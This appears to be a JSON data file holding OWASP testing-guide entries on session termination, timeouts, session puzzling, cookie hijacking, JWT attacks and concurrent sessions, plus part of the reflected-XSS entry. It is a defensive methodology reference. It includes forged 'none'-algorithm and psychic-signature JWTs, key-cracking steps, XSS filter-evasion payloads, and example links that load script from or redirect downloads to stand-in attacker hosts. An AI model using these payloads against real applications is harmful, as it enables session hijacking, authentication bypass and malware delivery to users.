        "summary": "<h3>Summary</h3><p>Session termination is an important part of the session lifecycle. Reducing to a minimum the lifetime of the session tokens decreases the likelihood of a successful session hijacking attack. This can be seen as a control against preventing other attacks like Cross Site Scripting and Cross Site Request Forgery. Such attacks have been known to rely on a user having an authenticated session present. Not having a secure session termination only increases the attack surface for any of these attacks.</p><p>A secure session termination requires at least the following components:</p><ul><li>Availability of user interface controls that allow the user to manually log out.</li><li>Session termination after a given amount of time without activity (session timeout).</li><li>Proper invalidation of server-side session state.</li></ul><p>There are multiple issues which can prevent the effective termination of a session. For the ideal secure web application, a user should be able to terminate at any time through the user interface. Every page should contain a log out button on a place where it is directly visible. Unclear or ambiguous log out functions could cause the user not trusting such functionality.</p><p>Another common mistake in session termination is that the client-side session token is set to a new value while the server-side state remains active and can be reused by setting the session cookie back to the previous value. Sometimes only a confirmation message is shown to the user without performing any further action. This should be avoided.</p><p>Some web application frameworks rely solely on the session cookie to identify the logged-on user. The user’s ID is embedded in the (encrypted) cookie value. The application server does not do any tracking on the server-side of the session. When logging out, the session cookie is removed from the browser. However, since the application does not do any tracking, it does not know whether a session is logged out or not. So by reusing a session cookie it is possible to gain access to the authenticated session. A well-known example of this is the Forms Authentication functionality in ASP.NET.</p><p>Users of web browsers often don’t mind that an application is still open and just close the browser or a tab. A web application should be aware of this behavior and terminate the session automatically on the server-side after a defined amount of time.</p><p>The usage of a single sign-on (SSO) system instead of an application-specific authentication scheme often causes the coexistence of multiple sessions which have to be terminated separately. For instance, the termination of the application-specific session does not terminate the session in the SSO system. Navigating back to the SSO portal offers the user the possibility to log back in to the application where the log out was performed just before. On the other side a log out function in a SSO system does not necessarily cause session termination in connected applications.</p><h3>Test Objectives</h3><ul><li>Assess the logout UI.</li><li>Analyze the session timeout and if the session is properly killed after logout.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Verify the appearance and visibility of the log out functionality in the user interface. For this purpose, view each page from the perspective of a user who has the intention to log out from the web application.</p><p>There are some properties which indicate a good log out user interface:</p><ul><li>A log out button is present on all pages of the web application.</li><li>The log out button should be identified quickly by a user who wants to log out from the web application.</li><li>After loading a page the log out button should be visible without scrolling.</li><li>Ideally the log out button is placed in an area of the page that is fixed in the view port of the browser and not affected by scrolling of the content.</li></ul><p>First, store the values of cookies that are used to identify a session. Invoke the log out function and observe the behavior of the application, especially regarding session cookies. Try to navigate to a page that is only visible in an authenticated session, e.g. by usage of the back button of the browser. If a cached version of the page is displayed, use the reload button to refresh the page from the server. If the log out function causes session cookies to be set to a new value, restore the old value of the session cookies and reload a page from the authenticated area of the application. If these test don’t show any vulnerabilities on a particular page, try at least some further pages of the application that are considered as security-critical, to ensure that session termination is recognized properly by these areas of the application.</p><p>No data that should be visible only by authenticated users should be visible on the examined pages while performing the tests. Ideally the application redirects to a public area or a log in form while accessing authenticated areas after termination of the session. It should be not necessary for the security of the application, but setting session cookies to new values after log out is generally considered as good practice.</p><p>Try to determine a session timeout by performing requests to a page in the authenticated area of the web application with increasing delays. If the log out behavior appears, the used delay matches approximately the session timeout value.</p><p>The same results as for server-side session termination testing described before are excepted by a log out caused by an inactivity timeout.</p><p>The proper value for the session timeout depends on the purpose of the application and should be a balance of security and usability. In a banking applications it makes no sense to keep an inactive session more than 15 minutes. On the other side a short timeout in a wiki or forum could annoy users which are typing lengthy articles with unnecessary log in requests. There timeouts of an hour and more can be acceptable.</p><p>Perform a log out in the tested application. Verify if there is a central portal or application directory which allows the user to log back in to the application without authentication. Test if the application requests the user to authenticate, if the URL of an entry point to the application is requested. While logged in in the tested application, perform a log out in the SSO system. Then try to access an authenticated area of the tested application.</p><p>It is expected that the invocation of a log out function in a web application connected to a SSO system or in the SSO system itself causes global termination of all sessions. An authentication of the user should be required to gain access to the application after log out in the SSO system and connected application.</p>",
        "tools": "<h3>Tools</h3><ul><li>Burp Suite - Repeater</li></ul><h3>References</h3><ul><li>Cookie replay attacks in ASP.NET when using forms authentication</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-SESS-07": {
        "summary": "<h3>Summary</h3><p>In this phase testers check that the application automatically logs out a user when that user has been idle for a certain amount of time, ensuring that it is not possible to “reuse” the same session and that no sensitive data remains stored in the browser cache.</p><p>All applications should implement an idle or inactivity timeout for sessions. This timeout defines the amount of time a session will remain active in case there is no activity by the user, closing and invalidating the session upon the defined idle period since the last HTTP request received by the web application for a given session ID. The most appropriate timeout should be a balance between security (shorter timeout) and usability (longer timeout) and heavily depends on the sensitivity level of the data handled by the application. For example, a 60 minute log out time for a public forum can be acceptable, but such a long time would be too much in a home banking application (where a maximum timeout of 15 minutes is recommended). In any case, any application that does not enforce a timeout-based log out should be considered not secure, unless such behavior is required by a specific functional requirement.</p><p>The idle timeout limits the chances that an attacker has to guess and use a valid session ID from another user, and under certain circumstances could protect public computers from session reuse. However, if the attacker is able to hijack a given session, the idle timeout does not limit the attacker’s actions, as he can generate activity on the session periodically to keep the session active for longer periods of time.</p><p>Session timeout management and expiration must be enforced server-side. If some data under the control of the client is used to enforce the session timeout, for example using cookie values or other client parameters to track time references (e.g. number of minutes since log in time), an attacker could manipulate these to extend the session duration. So the application has to track the inactivity time server-side and, after the timeout is expired, automatically invalidate the current user’s session and delete every data stored on the client.</p><p>Both actions must be implemented carefully, in order to avoid introducing weaknesses that could be exploited by an attacker to gain unauthorized access if the user forgot to log out from the application. More specifically, as for the log out function, it is important to ensure that all session tokens (e.g. cookies) are properly destroyed or made unusable, and that proper controls are enforced server-side to prevent the reuse of session tokens. If such actions are not properly carried out, an attacker could replay these session tokens in order to “resurrect” the session of a legitimate user and impersonate him/her (this attack is usually known as ‘cookie replay’). Of course, a mitigating factor is that the attacker needs to be able to access those tokens (which are stored on the victim’s PC), but, in a variety of cases, this may not be impossible or particularly difficult.</p><p>The most common scenario for this kind of attack is a public computer that is used to access some private information (e.g., web mail, online bank account). If the user moves away from the computer without explicitly logging out and the session timeout is not implemented on the application, then an attacker could access to the same account by simply pressing the “back” button of the browser.</p><h3>Test Objectives</h3><ul><li>Validate that a hard session timeout exists.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>The same approach seen in the Testing for logout functionality section can be applied when measuring the timeout log out.\nThe testing methodology is very similar. First, testers have to check whether a timeout exists, for instance, by logging in and waiting for the timeout log out to be triggered. As in the log out function, after the timeout has passed, all session tokens should be destroyed or be unusable.</p><p>Then, if the timeout is configured, testers need to understand whether the timeout is enforced by the client or by the server (or both). If the session cookie is non-persistent (or, more in general, the session cookie does not store any data about the time), testers can assume that the timeout is enforced by the server. If the session cookie contains some time related data (e.g., log in time, or last access time, or expiration date for a persistent cookie), then it’s possible that the client is involved in the timeout enforcing. In this case, testers could try to modify the cookie (if it’s not cryptographically protected) and see what happens to the session. For instance, testers can set the cookie expiration date far in the future and see whether the session can be prolonged.</p><p>As a general rule, everything should be checked server-side and it should not be possible, by re-setting the session cookies to previous values, to access the application again.</p><p>The tester needs to check that:</p><ul><li>The log out function effectively destroys all session token, or at least renders them unusable,</li><li>The server performs proper checks on the session state, disallowing an attacker to replay previously destroyed session identifiers</li><li>A timeout is enforced and it is properly enforced by the server. If the server uses an expiration time that is read from a session token that is sent by the client (but this is not advisable), then the token must be cryptographically protected from tampering.</li></ul><p>Note that the most important thing is for the application to invalidate the session on the server-side. Generally this means that the code must invoke the appropriate methods, e.g. HttpSession.invalidate() in Java and Session.abandon() in .NET. Clearing the cookies from the browser is advisable, but is not strictly necessary, since if the session is properly invalidated on the server, having the cookie in the browser will not help an attacker.</p><h3>References</h3><ul><li>Session Management Cheat Sheet</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-SESS-08": {
        "summary": "<h3>Summary</h3><p>Session Variable Overloading (also known as Session Puzzling) is an application level vulnerability which can enable an attacker to perform a variety of malicious actions, including but not limited to:</p><ul><li>Bypass efficient authentication enforcement mechanisms, and impersonate legitimate users.</li><li>Elevate the privileges of a malicious user account, in an environment that would otherwise be considered foolproof.</li><li>Skip over qualifying phases in multi-phase processes, even if the process includes all the commonly recommended code level restrictions.</li><li>Manipulate server-side values in indirect methods that cannot be predicted or detected.</li><li>Execute traditional attacks in locations that were previously unreachable, or even considered secure.</li></ul><p>This vulnerability occurs when an application uses the same session variable for more than one purpose. An attacker can potentially access pages in an order unanticipated by the developers so that the session variable is set in one context and then used in another.</p><p>For example, an attacker could use session variable overloading to bypass authentication enforcement mechanisms of applications that enforce authentication by validating the existence of session variables that contain identity–related values, which are usually stored in the session after a successful authentication process. This means an attacker first accesses a location in the application that sets session context and then accesses privileged locations that examine this context.</p><p>For example - an authentication bypass attack vector could be executed by accessing a publicly accessible entry point (e.g. a password recovery page) that populates the session with an identical session variable, based on fixed values or on user originating input.</p><h3>Test Objectives</h3><ul><li>Identify all session variables.</li><li>Break the logical flow of session generation.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>This vulnerability can be detected and exploited by enumerating all of the session variables used by the application and in which context they are valid. In particular this is possible by accessing a sequence of entry points and then examining exit points. In case of black-box testing this procedure is difficult and requires some luck since every different sequence could lead to a different result.</p><p>A very simple example could be the password reset functionality that, in the entry point, could request the user to provide some identifying information such as the username or the email address. This page might then populate the session with these identifying values, which are received directly from the client-side, or obtained from queries or calculations based on the received input. At this point there may be some pages in the application that show private data based on this session object. In this manner the attacker could bypass the authentication process.</p><p>The most effective way to detect these vulnerabilities is via a source code review.</p>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>Session variables should only be used for a single consistent purpose.</p><h3>References</h3><ul><li>Session Puzzles</li><li>Session Puzzling and Session Race Conditions</li></ul>",
        "test_objectives": ""
    },
    "WSTG-SESS-09": {
        "summary": "<h3>Summary</h3><p>An attacker who gets access to user session cookies can impersonate them by presenting such cookies. This attack is known as session hijacking. When considering network attackers, i.e., attackers who control the network used by the victim, session cookies can be unduly exposed to the attacker over HTTP. To prevent this, session cookies should be marked with the Secure attribute so that they are only communicated over HTTPS.</p><p>Note that the Secure attribute should also be used when the web application is entirely deployed over HTTPS, otherwise the following cookie theft attack is possible. Assume that example.com is entirely deployed over HTTPS, but does not mark its session cookies as Secure . The following attack steps are possible:</p><p>Alternatively, session hijacking can be prevented by banning use of HTTP using HSTS . Note that there is a subtlety here related to cookie scoping. In particular, full HSTS adoption is required when session cookies are issued with the Domain attribute set.</p><p>Full HSTS adoption is described in a paper called Testing for Integrity Flaws in Web Sessions by Stefano Calzavara, Alvise Rabitti, Alessio Ragazzo, and Michele Bugliesi. Full HSTS adoption occurs when a host activates HSTS for itself and all its sub-domains. Partial HSTS adoption is when a host activates HSTS just for itself.</p><p>With the Domain attribute set, session cookies can be shared across sub-domains. Use of HTTP with sub-domains should be avoided to prevent the disclosure of unencrypted cookies sent over HTTP. To exemplify this security flaw, assume that the site example.com activates HSTS without the includeSubDomains option. The site issues session cookies with the Domain attribute set to example.com . The following attack is possible:</p><p>Full HSTS should be activated on the apex domain to prevent this attack.</p><h3>Test Objectives</h3><ul><li>Identify vulnerable session cookies.</li><li>Hijack vulnerable cookies and assess the risk level.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>The testing strategy is targeted at network attackers, hence it only needs to be applied to sites without full HSTS adoption (sites with full HSTS adoption are secure, since their cookies are not communicated over HTTP). We assume to have two testing accounts on the site under test, one to act as the victim and one to act as the attacker. We simulate a scenario where the attacker steals all the cookies which are not protected against disclosure over HTTP, and presents them to the site to access the victim’s account. If these cookies are enough to act on the victim’s behalf, session hijacking is possible.</p><p>Here are the steps for executing this test:</p><ul><li>in case there is no HSTS adoption: theSecureattribute is set.</li><li>in case there is partial HSTS adoption: theSecureattribute is set or theDomainattribute is not set.</li></ul><p>We recommend using two different machines or browsers for the victim and the attacker. This allows you to decrease the number of false positives if the web application does fingerprinting to verify access enabled from a given cookie. A shorter but less precise variant of the testing strategy only requires one testing account. It follows the same pattern, but it halts at step 5 (note that this makes step 3 useless).</p>",
        "tools": "<h3>Tools</h3><ul><li>ZAP</li><li>JHijack - a numeric session hijacking tool</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-SESS-10": {
        "summary": "<h3>Summary</h3><p>JSON Web Tokens (JWTs) are cryptographically signed JSON tokens, intended to share claims between systems. They are frequently used as authentication or session tokens, particularly on REST APIs.</p><p>JWTs are a common source of vulnerabilities, both in how they are in implemented in applications, and in the underlying libraries. As they are used for authentication, a vulnerability can easily result in a complete compromise of the application.</p><h3>Test Objectives</h3><ul><li>Determine whether the JWTs expose sensitive information.</li><li>Determine whether the JWTs can be tampered with or modified.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>JWTs are made up of three components:</p><ul><li>The header</li><li>The payload (or body)</li><li>The signature</li></ul><p>Each component is base64 encoded, and they are separated by periods ( . ). Note that the base64 encoding used in a JWT strips out the equals signs ( = ), so you may need to add these back in to decode the sections.</p><p>The header defines the type of token (typically JWT ), and the algorithm used for the signature. An example decoded header is shown below:</p><pre><code>{ \"alg\" : \"HS256\" , \"typ\" : \"JWT\" }</code></pre><p>There are three main types of algorithms that are used to calculate the signatures:</p><p>There are also a wide range of other algorithms which may be used for encrypted tokens (JWEs), although these are less common.</p><p>The payload of the JWT contains the actual data. An example payload is shown below:</p><pre><code>{ \"username\" : \"administrator\" , \"is_admin\" : true , \"iat\" : 1516239022 , \"exp\" : 1516242622 }</code></pre><p>The payload is it not usually encrypted, so review it to determine whether there is any sensitive of potentially inappropriate data included within it.</p><p>This JWT includes the username and administrative status of the user, as well as two standard claims ( iat and exp ). These claims are defined in RFC 5719 , a brief summary of them is given in the table below:</p><p>The signature is calculated using the algorithm defined in the JWT header, and then base64 encoded and appended to the token. Modifying any part of the JWT should cause the signature to be invalid, and the token to be rejected by the server.</p><p>As well as being cryptographically secure itself, the JWT also needs to be stored and sent in a secure manner. This should include checks that:</p><ul><li>It is alwayssent over encrypted (HTTPS) connections.</li><li>If it is stored in a cookie, then it should bemarked with appropriate attributes.</li></ul><p>The validity of the JWT should also be reviewed, based on the iat , nbf and exp claims, to determine that:</p><ul><li>The JWT has a reasonable lifespan for the application.</li><li>Expired tokens are rejected by the application.</li></ul><p>One of the most serious vulnerabilities encountered with JWTs is when the application fails to validate that the signature is correct. This usually occurs when a developer uses a function such as the NodeJS jwt.decode() function, which simply decodes the body of the JWT, rather than jwt.verify() , which verifies the signature before decoding the JWT.</p><p>This can be easily tested for by modifying the body of the JWT without changing anything in the header or signature, submitting it in a request to see if the application accepts it.</p><p>As well as the public key and HMAC-based algorithms, the JWT specification also defines a signature algorithm called none . As the name suggests, this means that there is no signature for the JWT, allowing it to be modified.</p><p>This can be tested by modifying the signature algorithm ( alg ) in the JWT header to none , as shown in the example below:</p><pre><code>{ \"alg\" : \"none\" , \"typ\" : \"JWT\" }</code></pre><p>The header and payload are then re-encoded with base64, and the signature is removed (leaving the trailing period). Using the header above, and the payload listed in the payload section, this would give the following JWT:</p><pre><code>eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0K.eyJ1c2VybmFtZSI6ImFkbWluaW5pc3RyYXRvciIsImlzX2FkbWluIjp0cnVlLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTUxNjI0MjYyMn0.</code></pre><p>Some implementations try and avoid this by explicitly blocking the use of the none algorithm. If this is done in a case-insensitive way, it may be possible to bypass by specifying an algorithm such as NoNe .</p><p>A vulnerability was identified in Java version 15 to 18 where they did not correctly validate ECDSA signatures in some circumstances ( CVE-2022-21449 , known as “psychic signatures”). If one of these vulnerable versions is used to parse a JWT using the ES256 algorithm, this can be used to completely bypass the signature verification by tampering the body and then replacing the signature with the following value:</p><pre><code>MAYCAQACAQA</code></pre><p>Resulting in a JWT which looks something like this:</p><pre><code>eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.MAYCAQACAQA</code></pre><p>If the JWT is signed using a HMAC-based algorithm (such as HS256), the security of the signature is entirely reliant on the strength of the secret key used in the HMAC.</p><p>If the application is using off-the-shelf or open source software, the first step should be go investigate the code, and see whether there is default HMAC signing key that is used.</p><p>If there isn’t a default, then it may be possible to crack guess or brute-force they key. The simplest way to do this is to use the crackjwt.py script, which simply requires the JWT and a dictionary file.</p><p>A more powerful option is to convert the JWT into a format that can be used by John the Ripper using the jwt2john.py script. John can then be used to carry out much more advanced attacks against the key.</p><p>If the JWT is large, it may exceed the maximum size supported by John. This can be worked around by increasing the value of the SALT_LIMBS variable in /src/hmacSHA256_fmt_plug.c (or the equivalent file for other HMAC formats) and recompiling John, as discussed in the following GitHub issue .</p><p>If this key can be obtained, then it is possible to create and sign arbitrary JWTs, which usually results in a complete compromise of the application.</p><p>If the application uses JWTs with public key based signatures, but does not check that the algorithm is correct, this can potentially exploit this in a signature type confusion attack. In order for this to be successful, the following conditions need to be met:</p><p>If all of these conditions are true, then an attacker can use the public key to sign the JWT using a HMAC based algorithm (such as HS256 ). For example, the Node.js jsonwebtoken library uses the same function for both public key and HMAC based tokens, as shown in the example below:</p><pre><code>// Verify a JWT signed using RS256 jwt . verify ( token , publicKey ); // Verify a JWT signed using HS256 jwt . verify ( token , secretKey );</code></pre><p>This means that if the JWT is signed using publicKey as a secret key for the HS256 algorithm, the signature will be considered valid.</p><p>In order to exploit this issue, the public key must be obtained. The most common way this can happen is if the application re-uses the same key for both signing JWTs and as part of the TLS certificate. In this case, the key can be downloaded from the server using a command such as the following:</p><pre><code>openssl s_client -connect example.org:443 | openssl x509 -pubkey -noout</code></pre><p>Alternatively, the key may be available from a public file on the site at a common location such as /.well-known/jwks.json .</p><p>In order to test this, modify the contents of the JWT, and then use the previously obtained public key to sign the JWT using the HS256 algorithm. This is often difficult to perform when testing without access to the source code or implementation details, because the format of the key must be identical to the one used by the server, so issues such as empty space or CRLF encoding may result in the keys not matching.</p><p>The JSON Web Signature (JWS) standard (which defines the header and signatures used by JWTs) allows the key used to sign the token to be embedded in the header. If the library used to validate the token supports this, and doesn’t check the key against a list of approved keys, this allows an attacker to sign an JWT with an arbitrary key that they provide.</p><p>There are a variety of scripts that can be used to do this, such as jwk-node-jose.py or jwt_tool .</p><h3>Related Test Cases</h3><ul><li>Testing for Sensitive Information Sent via Unencrypted Channels.</li><li>Testing for Cookie Attributes.</li><li>Testing Browser Storage.</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>John the Ripper</li><li>jwt2john</li><li>jwt-cracker</li><li>JSON Web Tokens Burp Extension</li><li>ZAP JWT Add-on</li></ul><h3>References</h3><ul><li>RFC 7515 JSON Web Signature (JWS)</li><li>RFC 7519 JSON Web Token (JWT)</li><li>OWASP JSON Web Token Cheat Sheet</li></ul>",
        "remediation": "<h3>Remediation</h3><ul><li>Use a secure and up to date library to handle JWTs.</li><li>Ensure that the signature is valid, and that it is using the expected algorithm.</li><li>Use a strong HMAC key or a unique private key to sign them.</li><li>Ensure that there is no sensitive information exposed in the payload.</li><li>Ensure that JWTs are securely stored and transmitted.</li><li>See theOWASP JSON Web Tokens Cheat Sheet.</li></ul>",
        "test_objectives": ""
    },
    "WSTG-SESS-11": {
        "summary": "<h3>Summary</h3><p>Concurrent sessions are a common aspect of web applications that enable multiple simultaneous user interactions. This test case aims to evaluate the application’s ability to handle multiple active sessions for a single user. This functionality is essential for effectively managing concurrent user sessions, particularly in sensitive areas such as admin panels containing Personally Identifiable Information (PII), personal user accounts, or APIs reliant on third-party services to enrich user-provided data. The primary objective is to ensure that concurrent sessions align with the application’s security requirements.</p><p>Understanding the security needs in an application is key to assessing whether enabling concurrent sessions corresponds with the intended features. Allowing concurrent sessions isn’t inherently detrimental and is intentionally permitted in many applications. However, it is crucial to ensure that the application’s functionality is effectively aligned with its security measures concerning concurrent sessions. If concurrent sessions are intended, it is vital to ensure additional security controls, such as managing active sessions, terminating sessions, and potential new session notifications. Conversely, if concurrent sessions are not intended or planned within the application, it is crucial to validate existing checks for session management vulnerabilities.</p><p>To recognize that concurrent sessions are essential, you should consider the following factors:</p><ul><li>Understanding the application’s nature, particularly situations where users might require simultaneous access from different locations or devices.</li><li>Identifying critical operations, such as financial transactions that require secure access.</li><li>Handling sensitive data like Personally Identifiable Information (PII), indicating the necessity for secure interactions.</li><li>Distinguishing between a management panel and a standard user dashboard for normal user access.</li></ul><h3>Test Objectives</h3><ul><li>Evaluate the application’s session management by assessing the handling of multiple active sessions for a single user account.</li></ul>",
        "how-to": "<h3>How to Test</h3><ul><li>Submit valid credentials (username and password) to create a session.</li><li>Example HTTP Request:POST/loginHTTP/1.1Host:www.example.comContent-Length:32username=admin&password=admin123</li><li>Example Response:HTTP/1.1200OKSet-Cookie:SESSIONID=0add0d8eyYq3HIUy09hhus; Path=/; Secure</li><li>Store the generated authentication cookie. In some cases, the generated authentication cookie is replaced by tokens such as JSON Web Tokens (JWT).</li></ul><p>Example HTTP Request:</p><pre><code>POST /login HTTP / 1.1 Host : www.example.com Content-Length : 32 username=admin&password=admin123</code></pre><p>Example Response:</p><pre><code>HTTP / 1.1 200 OK Set-Cookie : SESSIONID=0add0d8eyYq3HIUy09hhus; Path=/; Secure</code></pre><ul><li>Attempt to create multiple authentication cookies by submitting login requests (e.g., one hundred times).</li></ul><p>Note: Utilizing private browsing mode or multi-account containers might be beneficial for conducting these tests, as they can provide separate environments for testing session management without interference from existing sessions or cookies stored in the browser.</p><ul><li>Try accessing the application using the initial session token (e.g.,SESSIONID=0add0d8eyYq3HIUy09hhus).</li><li>If successful authentication occurs with the first generated token, consider it a potential issue indicating inadequate session management.</li></ul><p>Also, there are additional test cases that extend the scope of the testing methodology to include scenarios involving multiple sessions originating from various IPs and locations. These test cases aid in identifying potential vulnerabilities or irregularities in session handling related to geographical or network-based factors:</p><ul><li>Test Multiple sessions from the same IP.</li><li>Test Multiple sessions from different IPs.</li><li>Test Multiple sessions from locations that are unlikely or impossible to be visited by the same user in a short period of time (e.g., one session created in a specific country, followed by another session generated five minutes later from a different country).</li></ul>",
        "tools": "<h3>Recommended Tools</h3><ul><li>Zed Attack Proxy</li><li>Burp Suite Web Proxy</li></ul>",
        "remediation": "<h3>Remediation</h3><p>The application should monitor and limit the number of active sessions per user account. If the maximum allowed sessions are surpassed, the system must invalidate previous sessions to maintain security. Implementing additional solutions can further mitigate this vulnerability:</p>",
        "test_objectives": ""
    },
    "WSTG-INPV-01": {
        "summary": "<h3>Summary</h3><p>Reflected Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.</p><p>Reflected XSS are the most frequent type of XSS attacks found in the wild. Reflected XSS attacks are also known as non-persistent XSS attacks and, since the attack payload is delivered and executed via a single request and response, they are also referred to as first-order or type 1 XSS.</p><p>When a web application is vulnerable to this type of attack, it will pass unvalidated input sent through requests back to the client. The common modus operandi of the attack includes a design step, in which the attacker creates and tests an offending URI, a social engineering step, in which she convinces her victims to load this URI on their browsers, and the eventual execution of the offending code using the victim’s browser.</p><p>Commonly the attacker’s code is written in the JavaScript language, but other scripting languages are also used, e.g., ActionScript and VBScript. Attackers typically leverage these vulnerabilities to install key loggers, steal victim cookies, perform clipboard theft, and change the content of the page (e.g., download links).</p><p>One of the primary difficulties in preventing XSS vulnerabilities is proper character encoding. In some cases, the web server or the web application could not be filtering some encodings of characters, so, for example, the web application might filter out <script> , but might not filter %3cscript%3e which simply includes another encoding of tags.</p><h3>Test Objectives</h3><ul><li>Identify variables that are reflected in responses.</li><li>Assess the input they accept and the encoding that gets applied on return (if any).</li></ul>",
        "how-to": "<h3>How to Test</h3><p>A black-box test will include at least three phases:</p><p>Detect input vectors. For each web page, the tester must determine all the web application’s user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below.</p><p>Analyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated predefined list of known attack strings, or manually.\n  Some example of such input data are the following:</p><ul><li><script>alert(123)</script></li><li>\"><script>alert(document.cookie)</script></li></ul><p>For a comprehensive list of potential test strings see the XSS Filter Evasion Cheat Sheet .</p><p>For each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application’s security. This requires examining the resulting web page HTML and searching for the test input. Once found, the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML.</p><p>Ideally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are:</p><ul><li>>(greater than)</li><li><(less than)</li><li>&(ampersand)</li><li>'(apostrophe or single quote)</li><li>\"(double quote)</li></ul><p>However, a full list of entities is defined by the HTML and XML specifications. Wikipedia has a complete reference .</p><p>Within the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. These characters include:</p><ul><li>\\n(new line)</li><li>\\r(carriage return)</li><li>'(apostrophe or single quote)</li><li>\"(double quote)</li><li>\\(backslash)</li><li>\\uXXXX(unicode values)</li></ul><p>For a more complete reference, see the Mozilla JavaScript guide .</p><p>For example, consider a site that has a welcome notice Welcome %username% and a download link.</p><p>Figure 4.7.1-1: XSS Example 1</p><br><p>The tester must suspect that every data entry point can result in an XSS attack. To analyze it, the tester will play with the user variable and try to trigger the vulnerability.</p><p>Let’s try to click on the following link and see what happens:</p><pre><code>https://example.com/index.php?user=<script>alert(123)</script></code></pre><p>If no sanitization is applied this will result in the following popup:</p><p>Figure 4.7.1-2: XSS Example 1</p><br><p>This indicates that there is an XSS vulnerability and it appears that the tester can execute code of his choice in anybody’s browser if he clicks on the tester’s link.</p><p>Let’s try other piece of code (link):</p><pre><code>https://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName(\"a\");AllLinks[0].href = \"https://badexample.com/malicious.exe\";}</script></code></pre><p>This produces the following behavior:</p><p>Figure 4.7.1-3: XSS Example 2</p><br><p>This will cause the user, clicking on the link supplied by the tester, to download the file malicious.exe from a site they control.</p><p>Reflected cross-site scripting attacks are prevented as the web application sanitizes input, a web application firewall blocks malicious input, or by mechanisms embedded in modern web browsers. The tester must test for vulnerabilities assuming that web browsers will not prevent the attack. Browsers may be out of date, or have built-in security features disabled. Similarly, web application firewalls are not guaranteed to recognize novel, unknown attacks. An attacker could craft an attack string that is unrecognized by the web application firewall.</p><p>Thus, the majority of XSS prevention must depend on the web application’s sanitization of untrusted user input. There are several mechanisms available to developers for sanitization, such as returning an error, removing, encoding, or replacing invalid input. The means by which the application detects and corrects invalid input is another primary weakness in preventing XSS. A deny list may not include all possible attack strings, an allow list may be overly permissive, the sanitization could fail, or a type of input may be incorrectly trusted and remain unsanitized. All of these allow attackers to circumvent XSS filters.</p><p>The XSS Filter Evasion Cheat Sheet documents common filter evasion tests.</p><p>Since these filters are based on a deny list, they could not block every type of expressions. In fact, there are cases in which an XSS exploit can be carried out without the use of <script> tags and even without the use of characters such as < and > that are commonly filtered.</p><p>For example, the web application could use the user input value to fill an attribute, as shown in the following code:</p><pre><code><input type= \"text\" name= \"state\" value= \"INPUT_FROM_USER\" ></code></pre><p>Then an attacker could submit the following code:</p><pre><code>\" onfocus=\"alert(document.cookie)</code></pre><p>In some cases it is possible that signature-based filters can be simply defeated by obfuscating the attack. Typically you can do this through the insertion of unexpected variations in the syntax or in the encoding. These variations are tolerated by browsers as valid HTML when the code is returned, and yet they could also be accepted by the filter.</p><p>Following some examples:</p><ul><li>\"><script >alert(document.cookie)</script ></li><li>\"><ScRiPt>alert(document.cookie)</ScRiPt></li><li>\"%3cscript%3ealert(document.cookie)%3c/script%3e</li></ul><p>Sometimes the sanitization is applied only once and it is not being performed recursively. In this case the attacker can beat the filter by sending a string containing multiple attempts, like this one:</p><pre><code><scr<script>ipt>alert(document.cookie)</script></code></pre><p>Now suppose that developers of the target site implemented the following code to protect the input from the inclusion of external script:</p><pre><code><? $re = \"/<script[^>]+src/i\" ; if ( preg_match ( $re , $_GET [ 'var' ])) { echo \"Filtered\" ; return ; } echo \"Welcome \" . $_GET [ 'var' ] . \" !\" ; ?></code></pre><p>Decoupling the above regular expression:</p><p>This is useful for filtering expressions like <script src=\"https://attacker/xss.js\"></script> which is a common attack. But, in this case, it is possible to bypass the sanitization by using the > character in an attribute between script and src, like this:</p><pre><code>https://example/?var=<SCRIPT%20a=\">\"%20SRC=\"https://attacker/xss.js\"></SCRIPT></code></pre><p>This will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker’s web server as if it was originating from the victim site, https://example/ .</p><p>Another method to bypass filters is the HTTP Parameter Pollution, this technique was first presented by Stefano di Paola and Luca Carettoni in 2009 at the OWASP Poland conference. See the Testing for HTTP Parameter pollution for more information. This evasion technique consists of splitting an attack vector between multiple parameters that have the same name. The manipulation of the value of each parameter depends on how each web technology is parsing these parameters, so this type of evasion is not always possible. If the tested environment concatenates the values of all parameters with the same name, then an attacker could use this technique in order to bypass pattern- based security mechanisms.\nRegular attack:</p><pre><code>https://example/page.php?param=<script>[...]</script></code></pre><p>Attack using HPP:</p><pre><code>https://example/page.php?param=<script&param=>[...]</&param=script></code></pre><p>See the XSS Filter Evasion Cheat Sheet for a more detailed list of filter evasion techniques. Finally, analyzing answers can get complex. A simple way to do this is to use code that pops up a dialog, as in our example. This typically indicates that an attacker could execute arbitrary JavaScript of his choice in the visitors’ browsers.</p><p>Gray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and how the user input is rendered back to the user might be known by 